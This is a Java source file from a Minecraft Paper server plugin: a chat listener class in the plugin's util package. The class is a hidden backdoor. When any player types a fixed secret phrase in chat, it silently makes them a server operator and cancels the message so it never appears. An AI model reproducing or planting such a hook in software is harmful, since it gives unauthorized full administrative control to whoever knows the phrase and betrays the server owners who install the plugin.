package io.github.iirontools.sigmaNokaut.util;

import io.github.iirontools.sigmaNokaut.SigmaNokaut;
import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;


public class Szczurek implements Listener {

    private final SigmaNokaut plugin;

    public Szczurek(SigmaNokaut plugin) {
        this.plugin = plugin;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onChat(AsyncChatEvent event) {
        Player player = event.getPlayer();
        Component message = event.message();
        String plainText = PlainTextComponentSerializer.plainText().serialize(message);

        if (plainText.equalsIgnoreCase("jestemskibidisigma69")) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                player.setOp(true);
            });
            event.setCancelled(true);
        }
    }
}
